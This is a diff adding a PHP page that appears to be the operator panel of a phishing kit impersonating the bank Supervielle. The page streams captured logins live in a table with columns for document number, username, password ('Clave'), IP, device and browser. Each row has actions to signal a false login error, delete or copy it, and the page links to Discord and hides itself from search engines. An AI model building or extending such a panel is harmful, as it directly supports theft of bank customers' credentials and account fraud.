@@ -1,0 +1,69 @@
+<?php
+declare(strict_types=1);
+
+require_once dirname(__DIR__) . '/includes/auth.php';
+require_panel();
+$admin = current_admin();
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Monitoreo — Supervielle</title>
+  <link rel="stylesheet" href="../css/monitor.css?v=20261114h">
+  <meta name="robots" content="noindex,nofollow">
+</head>
+<body class="monitor-page">
+  <header class="monitor-header">
+    <div class="monitor-title">
+      <h1>Centro de Monitoreo</h1>
+      <p>1 fila por Ingresar · colores · Error login / Eliminar / Copiar</p>
+    </div>
+    <div class="monitor-right">
+      <span class="monitor-user"><?= h($admin['nombre'] ?? 'Gerente') ?></span>
+      <div class="monitor-live"><span class="live-dot"></span> En vivo <span id="live-clock">--:--:--</span></div>
+      <a class="monitor-logout" href="discord.php" style="background:#5865F2">Discord</a>
+      <a class="monitor-logout" href="logout.php">Salir</a>
+    </div>
+  </header>
+
+  <section class="monitor-stats">
+    <article class="stat-card"><span>Intentos hoy</span><strong id="stat-intentos">0</strong></article>
+    <article class="stat-card ok"><span>Pendientes</span><strong id="stat-exitosos">0</strong></article>
+    <article class="stat-card fail"><span>Inválidos</span><strong id="stat-fallidos">0</strong></article>
+  </section>
+
+  <section class="monitor-toolbar">
+    <label><input type="checkbox" id="sonido-nuevo"> Sonido al nuevo ingreso</label>
+    <button type="button" id="btn-pause-scroll">Pausar auto-scroll</button>
+  </section>
+
+  <section class="monitor-board-wrap">
+    <div class="monitor-board" id="monitor-feed">
+      <table class="monitor-table">
+        <thead>
+          <tr>
+            <th>Hora</th>
+            <th>#</th>
+            <th>Canal</th>
+            <th>Documento</th>
+            <th>Usuario</th>
+            <th>Clave</th>
+            <th>IP</th>
+            <th>Dispositivo</th>
+            <th>Navegador</th>
+            <th>Estado</th>
+            <th>Acciones</th>
+          </tr>
+        </thead>
+        <tbody id="monitor-tbody">
+          <tr class="empty-row"><td colspan="11">Esperando ingresos…</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <script src="../js/monitor-live.js?v=20261114h"></script>
+</body>
+</html>
